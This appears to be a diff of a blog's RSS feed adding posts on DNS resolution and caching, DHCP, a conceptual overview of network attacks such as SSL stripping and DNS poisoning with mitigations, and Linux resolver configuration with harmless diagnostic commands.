+&lt;h3 id=&#34;14-authoritative-nameserver&#34;&gt;1.4. Authoritative nameserver&lt;/h3&gt;
+&lt;p&gt;When a recursive resolver &lt;strong&gt;receives a response from&lt;/strong&gt; a TLD nameserver, that response will direct the resolver to an authoritative nameserver.&lt;/p&gt;
+&lt;p&gt;The authoritative nameserver contains information specific to the domain name it serves (e.g. google.com) and it can provide a recursive resolver with the IP address of that server found in the &lt;a href=&#34;https://www.cloudflare.com/learning/dns/dns-records/dns-a-record/&#34;&gt;DNS A record&lt;/a&gt;, or if the domain has a &lt;a href=&#34;https://www.cloudflare.com/learning/dns/dns-records/dns-cname-record/&#34;&gt;CNAME record&lt;/a&gt; (alias) it will provide the recursive resolver with an alias domain, at which point the recursive resolver will have to perform a whole new DNS lookup to procure a record from an authoritative nameserver (often an A record containing an IP address).&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;DNS A record is actually a map between the domain name and its ipv4 address.&lt;/p&gt;
+&lt;p&gt;DNS CNAME record is an alias for that domain.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;After buy a domain on a website, the most common operations we use are that &lt;strong&gt;change its nameservers&lt;/strong&gt; and &lt;strong&gt;update its DNS records&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/01/c9d1480f89adaf900fcc9d104cb8e921.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Here, Change the NameServers option if to change the &lt;strong&gt;authoritative nameserver&lt;/strong&gt; of your domain, and update the DNS records is to set ip address (A record) or alias (CNAME record) for your domain.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/01/660f9f8211ebaeac8ffea3c050c94d78.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-dns-queries&#34;&gt;2. DNS queries&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Recursive query&lt;/strong&gt; - In a recursive query, a DNS client requires that a DNS server (typically a DNS recursive resolver) will respond to the client with either the requested resource record or an error message if the resolver can&amp;rsquo;t find the record.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Iterative query&lt;/strong&gt; - in this situation the DNS client will allow a DNS server to return the best answer it can.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Non-recursive query&lt;/strong&gt;: learn more: &lt;a href=&#34;https://www.cloudflare.com/learning/dns/what-is-dns/&#34;&gt;What is DNS? | How DNS works | Cloudflare&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;3-dns-caching&#34;&gt;3. DNS caching&lt;/h2&gt;
+&lt;h3 id=&#34;31-browser-dns-caching&#34;&gt;3.1. Browser DNS caching&lt;/h3&gt;
+&lt;p&gt;Modern web browsers are designed by default to cache DNS records for a set amount of time. The purpose here is obvious; the closer the DNS caching occurs to the web browser, the fewer processing steps must be taken in order to check the cache and make the correct requests to an IP address. When a request is made for a DNS record, the browser cache is the first location checked for the requested record.&lt;/p&gt;
+&lt;p&gt;In Chrome, you can see the status of your DNS cache by going to &lt;code&gt;chrome://net-internals/#dns&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/01/6666ce8db7adb7bc4e333d94ae70cb1d.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;32-operating-system-os-level-dns-caching&#34;&gt;3.2. Operating system (OS) level DNS caching&lt;/h4&gt;
+&lt;p&gt;The operating system level DNS resolver is the second and last local stop before a DNS query leaves your machine. The process inside your operating system that is designed to handle this query is commonly called a “&lt;strong&gt;stub resolver&lt;/strong&gt;” or &lt;strong&gt;DNS client&lt;/strong&gt;. When a stub resolver gets a request from an application, it first checks its own cache to see if it has the record. If it does not, it then sends a DNS query (with a recursive flag set), outside the local network to a DNS recursive resolver inside the Internet service provider (ISP).&lt;/p&gt;
+&lt;p&gt;When the recursive resolver inside the ISP receives a DNS query, like all previous steps, it will also check to see if the requested host-to-IP-address translation is already stored inside its local persistence layer.&lt;/p&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://www.cloudflare.com/learning/dns/what-is-dns/&#34;&gt;What is DNS? | How DNS works | Cloudflare&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Note that checking &lt;code&gt;/etc/hosts&lt;/code&gt; happens before DNS.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;33-recursive-resolver-caching&#34;&gt;3.3. Recursive resolver caching&lt;/h3&gt;
+&lt;p&gt;We have mentioned above, during DNS resolution process, &lt;strong&gt;the recursive resolver will cache information received from authoritative nameservers&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;A DNS resolver will save responses to IP address queries for a certain amount of time. In this way, the resolver can respond to future queries much more quickly, without needing to communicate with the many servers involved in the typical DNS resolution process.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>DHCP Basics</title>
+      <link>https://blog.jiyi27.com/posts/networking/003-dhcp/</link>
+      <pubDate>Mon, 30 Oct 2023 23:43:06 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/003-dhcp/</guid>
+      <description>&lt;h2 id=&#34;1-concepts&#34;&gt;1. Concepts&lt;/h2&gt;
+&lt;p&gt;Every device on a TCP/IP-based network must have a unique unicast IP address to access the network and its resources. Without DHCP, IP addresses for new computers or computers that are moved from one subnet to another must be configured manually; IP addresses for computers that are removed from the network must be manually reclaimed.&lt;/p&gt;
+&lt;p&gt;With DHCP, this entire process is automated and managed centrally. The DHCP server maintains a pool of IP addresses and leases an address to any DHCP-enabled client when it starts up on the network. Because the IP addresses are dynamic (leased) rather than static (permanently assigned), addresses no longer in use are automatically returned to the pool for reallocation.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-concepts&#34;&gt;1. Concepts&lt;/h2&gt;
+&lt;p&gt;Every device on a TCP/IP-based network must have a unique unicast IP address to access the network and its resources. Without DHCP, IP addresses for new computers or computers that are moved from one subnet to another must be configured manually; IP addresses for computers that are removed from the network must be manually reclaimed.&lt;/p&gt;
+&lt;p&gt;With DHCP, this entire process is automated and managed centrally. The DHCP server maintains a pool of IP addresses and leases an address to any DHCP-enabled client when it starts up on the network. Because the IP addresses are dynamic (leased) rather than static (permanently assigned), addresses no longer in use are automatically returned to the pool for reallocation.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The Dynamic Host Configuration Protocol (DHCP) is a network management protocol used on Internet Protocol (IP) networks for &lt;strong&gt;automatically assigning IP addresses and other communication parameters to devices&lt;/strong&gt; connected to the network using a client–server architecture.  &lt;a href=&#34;https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol&#34;&gt;Dynamic Host Configuration Protocol&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;2-process-of-dhcp&#34;&gt;2. Process of DHCP&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;DHCP Discover: When a computer (client) joins a network, it sends out a DHCP Discover message as a broadcast to discover DHCP servers available on the network.&lt;/li&gt;
+&lt;li&gt;DHCP Offer: DHCP servers that receive the Discover message respond with a DHCP Offer message. This message contains configuration parameters, including IP address, subnet mask, default gateway, and &lt;strong&gt;DNS server addresses&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;DHCP Request: The computer selects one of the DHCP Offers and sends a DHCP Request message to the chosen DHCP server, indicating its acceptance of the offered configuration.&lt;/li&gt;
+&lt;li&gt;DHCP Acknowledge: Upon receiving the DHCP Request, the DHCP server sends a DHCP Acknowledge message to the computer, confirming the lease of the offered configuration parameters. The computer now configures its network interface with the provided settings.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;3-dhcp-discover-message--dhcp-offer-message&#34;&gt;3. DHCP discover message &amp;amp; DHCP offer message&lt;/h2&gt;
+&lt;p&gt;Learn more about these two messages&amp;rsquo; format: &lt;a href=&#34;https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol&#34;&gt;Dynamic Host Configuration Protocol&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;References: &lt;a href=&#34;https://learn.microsoft.com/en-us/windows-server/networking/technologies/dhcp/dhcp-top&#34;&gt;Dynamic Host Configuration Protocol (DHCP) | Microsoft Learn&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Common Network Attacks</title>
+      <link>https://blog.jiyi27.com/posts/networking/010-common-attacks/</link>
+      <pubDate>Mon, 30 Oct 2023 22:44:57 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/010-common-attacks/</guid>
+      <description>&lt;h2 id=&#34;1-man-in-the-middle-attack&#34;&gt;1. Man-in-the-middle attack&lt;/h2&gt;
+&lt;p&gt;Learn more:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://davidzhu.xyz/post/cs-basics/002-ssh/&#34;&gt;https://davidzhu.xyz/post/cs-basics/002-ssh/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://davidzhu.xyz/post/cs-basics/003-ssl-secure-communication/#4-details-in-tls-handshake---avoid-man-in-middle-attack&#34;&gt;HTTPS SSL TLS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-ddos-attack&#34;&gt;2. DDoS attack&lt;/h2&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/networking/004-ddos-attack/&#34;&gt;DDoS Attack - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-csrf-attack&#34;&gt;3. CSRF attack&lt;/h2&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/http/007-csrf-attack/&#34;&gt;CSRF Attack and CORS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4-ssl-stripping&#34;&gt;4. SSL stripping&lt;/h2&gt;
+&lt;p&gt;SSL stripping attacks, also known as SSL strip, SSL downgrade, or HTTP downgrade attacks, strip the encryption offered by HTTPS, reducing the connection to the less-secure HTTP.&lt;/p&gt;
+&lt;p&gt;In order to &lt;a href=&#34;https://avicoder.me/2016/02/22/SSLstrip-for-newbies/&#34;&gt;“strip” the SSL&lt;/a&gt;, an attacker intervenes in the redirection of the HTTP to the secure HTTPS protocol and intercepts a request from the user to the server. The attacker will then continue to establish an HTTPS connection between himself and the server, and an unsecured HTTP connection with the user, acting as a “bridge” between them.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-man-in-the-middle-attack&#34;&gt;1. Man-in-the-middle attack&lt;/h2&gt;
+&lt;p&gt;Learn more:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://davidzhu.xyz/post/cs-basics/002-ssh/&#34;&gt;https://davidzhu.xyz/post/cs-basics/002-ssh/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://davidzhu.xyz/post/cs-basics/003-ssl-secure-communication/#4-details-in-tls-handshake---avoid-man-in-middle-attack&#34;&gt;HTTPS SSL TLS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-ddos-attack&#34;&gt;2. DDoS attack&lt;/h2&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/networking/004-ddos-attack/&#34;&gt;DDoS Attack - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-csrf-attack&#34;&gt;3. CSRF attack&lt;/h2&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/http/007-csrf-attack/&#34;&gt;CSRF Attack and CORS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4-ssl-stripping&#34;&gt;4. SSL stripping&lt;/h2&gt;
+&lt;p&gt;SSL stripping attacks, also known as SSL strip, SSL downgrade, or HTTP downgrade attacks, strip the encryption offered by HTTPS, reducing the connection to the less-secure HTTP.&lt;/p&gt;
+&lt;p&gt;In order to &lt;a href=&#34;https://avicoder.me/2016/02/22/SSLstrip-for-newbies/&#34;&gt;“strip” the SSL&lt;/a&gt;, an attacker intervenes in the redirection of the HTTP to the secure HTTPS protocol and intercepts a request from the user to the server. The attacker will then continue to establish an HTTPS connection between himself and the server, and an unsecured HTTP connection with the user, acting as a “bridge” between them.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/01/b0158611a93323eae52c342681549a60.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;How can the SSL strip trick both the browser and the website’s server? The SSL strip takes advantage of the way most users come to SSL websites. The majority of visitors connect to a website’s page that redirects through a 302 redirect, or they arrive on an SSL page via a link from a non-SSL site. If the victim wants, for instance, to buy a product and types the URL &lt;a href=&#34;https://www.buyme.com&#34;&gt;www.buyme.com&lt;/a&gt; in the address bar, the browser connects to the attacker&amp;rsquo;s machine and waits for a response from the server. In an SSL strip, the attacker, in turn, forwards the victim’s request to the online shop’s server and receives the secure HTTPS payment page. For example &lt;a href=&#34;https://www.buyme.com&#34;&gt;https://www.buyme.com&lt;/a&gt;. At this point, the attacker has complete control over the secure payment page. He downgrades it from HTTPS to HTTP and sends it back to the victim’s browser. The browser is now redirected to &lt;a href=&#34;http://www.buyme.com&#34;&gt;http://www.buyme.com&lt;/a&gt;. From now onward, all the victim’s data will be transferred in plain text format, and the attacker will be able to intercept it. Meanwhile, the website’s server will think that it has successfully established the secure connection, which indeed it has—but with the attacker’s machine, not the victim’s.&lt;/p&gt;
+&lt;h3 id=&#34;41-enable-ssl-sitewide-at-all-websites&#34;&gt;4.1. Enable SSL sitewide at all websites&lt;/h3&gt;
+&lt;p&gt;To mitigate this threat, financial institutions and technology firms have &lt;a href=&#34;https://venafi.com/blog/https-should-be-implemented-everywhereincluding-static-websites/&#34;&gt;already enabled&lt;/a&gt; HTTPS on a site-wide basis. Enabling HTTPS encrypts the connection between a browser and the website, thereby securing sensitive data transmissions. Therefore it makes perfect sense for banks and high-profile technology firms to enable HTTPS on their dynamic websites because of the transaction of important and sensitive information.&lt;/p&gt;
+&lt;h3 id=&#34;42-why-enable-hsts&#34;&gt;4.2. Why enable HSTS?&lt;/h3&gt;
+&lt;p&gt;In addition to enabling HTTPS on a site-wide basis, corporations should weigh the benefits of enabling &lt;a href=&#34;https://www.globalsign.com/en/blog/what-is-hsts-and-how-do-i-use-it/&#34;&gt;HSTS&lt;/a&gt; (HTTP Strict Transport Security), which is a web security policy mechanism that helps to protect websites against SSL stripping attacks and cookie hijacking. &lt;strong&gt;It allows&lt;/strong&gt; &lt;strong&gt;web servers to declare that&lt;/strong&gt; web browsers should interact with them using only secure HTTPS connections, and never via the insecure HTTP protocol.&lt;/p&gt;
+&lt;p&gt;When a web application issues HSTS Policy to user browsers, conformant user browsers will &lt;a href=&#34;https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet&#34;&gt;automatically redirect&lt;/a&gt; any insecure HTTP requests to HTTPS for the target website. In addition, when a man-in-the-middle attacker attempts to intercept traffic from a victim using an invalid certificate, HSTS does not allow the user to override the invalid certificate warning message. By having a HSTS policy installed, it will be nearly impossible for the attackers to intercept any information at all!&lt;/p&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://venafi.com/blog/what-are-ssl-stripping-attacks/&#34;&gt;What Are SSL Stripping Attacks? | Venafi&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;5-dns&#34;&gt;5. DNS&lt;/h2&gt;
+&lt;h3 id=&#34;51-dns-hijacking&#34;&gt;5.1. DNS hijacking&lt;/h3&gt;
+&lt;p&gt;To prevent DNS hijacking, first, you have to know the different kinds of attacks. DNS hijacking can take four different forms:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Local DNS hijacking:&lt;/strong&gt; An attacker installs &lt;a href=&#34;https://www.fortinet.com/resources/cyberglossary/trojan-horse-virus&#34;&gt;Trojan software&lt;/a&gt; on a user&amp;rsquo;s computer, then modifies the local DNS settings (cahnge its DNS server to a Rogue DNS server).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;DNS hijacking using a router:&lt;/strong&gt; Many routers have weak firmware or use the default passwords they were shipped with. Attackers can take advantage of this to hack a router and change its DNS settings, which will affect everyone that uses that router.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Man-in-the-middle (MITM) attacks:&lt;/strong&gt; Attackers use &lt;a href=&#34;https://www.fortinet.com/resources/cyberglossary/man-in-the-middle-attack&#34;&gt;man-in-the-middle attack techniques&lt;/a&gt; to intercept communications between users and a &lt;a href=&#34;https://www.fortinet.com/resources/cyberglossary/dynamic-dns&#34;&gt;DNS server&lt;/a&gt;. They then direct the target to malicious websites.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Learn more &lt;a href=&#34;https://www.fortinet.com/resources/cyberglossary/dns-hijacking&#34;&gt;What Is DNS Hijacking? How to Detect &amp;amp; Prevent It | Fortinet&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;52-dns-spoofing-vs-dns-cache-poisoning&#34;&gt;5.2. DNS spoofing vs DNS (cache) poisoning&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DNS Poisoning&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Definition&lt;/strong&gt;: The attacker inserts false address records into the DNS server&amp;rsquo;s cache, causing the server to return incorrect IP addresses for domain names.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Target&lt;/strong&gt;: The attack is on the DNS server.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: If &lt;code&gt;www.example.com&lt;/code&gt; is supposed to resolve to IP &lt;code&gt;1.2.3.4&lt;/code&gt;, in a DNS poisoning attack, the DNS server might be tricked into resolving it to &lt;code&gt;5.6.7.8&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DNS Spoofing&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Definition&lt;/strong&gt;: The attacker intercepts and responds to DNS requests with false information, usually &lt;strong&gt;before&lt;/strong&gt; the legitimate response is received.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: When a user tries to access &lt;code&gt;www.example.com&lt;/code&gt;, an attacker might intercept this request and send a fake response directing the user to IP &lt;code&gt;5.6.7.8&lt;/code&gt; instead of the real IP &lt;code&gt;1.2.3.4&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/networking/005-gfw-dns/&#34;&gt;GFW and DNS Poisoning - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;53-others&#34;&gt;5.3. Others&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DNS Poisoning vs DNS Spoofing&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DNS Poisoning: Inject false DNS info to the real server&amp;rsquo;s cache.&lt;/li&gt;
+&lt;li&gt;DNS Spoofing: Send false response back with a malicious DNS server.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Purpose of MAC Address Spoofing&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;To make a switch forward packets to an attacker&amp;rsquo;s device by mimicking a legitimate MAC address.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Use of ICMP Redirects in Man-in-the-Middle Attacks&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;An attacker sends forged &amp;ldquo;ICMP redirect messages&amp;rdquo; to mislead a host into changing its routing table, diverting traffic through the attacker&amp;rsquo;s machine.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;6-xss-attack&#34;&gt;6. XSS Attack&lt;/h2&gt;
+&lt;p&gt;可以到 &lt;a href=&#34;https://jiyi27.com/post/networking/009-xss-attack/&#34;&gt;XSS 攻击&lt;/a&gt; 查看&lt;/p&gt;
+&lt;h2 id=&#34;7-缓存投毒&#34;&gt;7. 缓存投毒&lt;/h2&gt;
+&lt;p&gt;可以到 &lt;a href=&#34;https://jiyi27.com/post/networking/010-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/&#34;&gt;缓存投毒&lt;/a&gt; 查看&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>DNS Stub and Recursive Resolver - Config Files</title>
+      <link>https://blog.jiyi27.com/posts/networking/002-host-file-dns-stub-resolver/</link>
+      <pubDate>Fri, 13 Oct 2023 14:03:57 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/002-host-file-dns-stub-resolver/</guid>
+      <description>&lt;h2 id=&#34;1-etchosts-and-etcresolvconf&#34;&gt;1. &lt;code&gt;/etc/hosts&lt;/code&gt; and &lt;code&gt;/etc/resolv.conf&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;On Linux or a Mac, if you add this to &lt;code&gt;/etc/hosts&lt;/code&gt;, facebook no longer exists:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;127.0.0.1 facebook.com
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/etc/hosts&lt;/code&gt; is used to resolve hostnames to IP addresses on a local machine. They&amp;rsquo;re &lt;strong&gt;looked at first&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Now&amp;hellip; If you don&amp;rsquo;t have an entry for a host in your host file, you need to ask someone what the IP is. That comes from a &lt;strong&gt;resolver&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;2-local-resolver--recursive-resolver&#34;&gt;2. Local resolver &amp;amp; recursive resolver&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Recursive resolver usually located at remote acts as a DNS server, whereas, a DNS stub resolver running on client devices.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-etchosts-and-etcresolvconf&#34;&gt;1. &lt;code&gt;/etc/hosts&lt;/code&gt; and &lt;code&gt;/etc/resolv.conf&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;On Linux or a Mac, if you add this to &lt;code&gt;/etc/hosts&lt;/code&gt;, facebook no longer exists:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;127.0.0.1 facebook.com
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/etc/hosts&lt;/code&gt; is used to resolve hostnames to IP addresses on a local machine. They&amp;rsquo;re &lt;strong&gt;looked at first&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Now&amp;hellip; If you don&amp;rsquo;t have an entry for a host in your host file, you need to ask someone what the IP is. That comes from a &lt;strong&gt;resolver&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;2-local-resolver--recursive-resolver&#34;&gt;2. Local resolver &amp;amp; recursive resolver&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Recursive resolver usually located at remote acts as a DNS server, whereas, a DNS stub resolver running on client devices.&lt;/p&gt;
+&lt;p&gt;Most Internet users use a recursive resolver provided by their ISP, but there are other options available; for example &lt;a href=&#34;https://www.cloudflare.com/learning/dns/what-is-1.1.1.1/&#34;&gt;Cloudflare&amp;rsquo;s 1.1.1.1&lt;/a&gt; or 8.8.8.8 provided by Google.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat /etc/resolv.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This is /run/systemd/resolve/stub-resolv.conf managed by man:systemd-resolved(8).&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Do not edit.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nameserver 127.0.0.53
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;127.0.0.53&lt;/code&gt; is the DNS server address, you can also manually change it to the IP of any DNS server (for example, change it to the famous Google DNS 8.8.8.8).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;127.x.x.x&lt;/code&gt; are loopback addresses that point to the local machine and are bound to the &lt;em&gt;&lt;strong&gt;&amp;ldquo;lo&amp;rdquo;&lt;/strong&gt;&lt;/em&gt; (loopback) network device. So who is this DNS server &lt;code&gt;127.0.0.53&lt;/code&gt;?&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo netstat -anp | grep 127.0.0.53
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 127.0.0.53:53           0.0.0.0:*               LISTEN      96729/systemd-resol 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 127.0.0.53:53           0.0.0.0:*                           96729/systemd-resol 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the output, we can see that the process uses  &lt;code&gt;127.0.0.53:53&lt;/code&gt;  called &lt;em&gt;&lt;strong&gt;systemd-resolve&lt;/strong&gt;&lt;/em&gt;. In &lt;code&gt;/etc/resolv.conf&lt;/code&gt; it says that it&amp;rsquo;s maintained by the &lt;em&gt;&lt;strong&gt;systemd-resolved&lt;/strong&gt;&lt;/em&gt; service. So we can try to check its status with systemctl:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ systemctl status systemd-resolved
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;● systemd-resolved.service - Network Name Resolution
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Loaded: loaded &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;/lib/systemd/system/systemd-resolved.service; enabled; vendor preset: enabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Active: active &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;running&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; since Tue 2023-10-10 01:56:13 UTC; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; days ago
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ....
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have know that the current DNS server on this machine is &lt;em&gt;&lt;strong&gt;systemd-resolve&lt;/strong&gt;&lt;/em&gt; which a DNS stub (client). So, what is the IP address of the actual DNS server? We can use the following command to check:&lt;/p&gt;
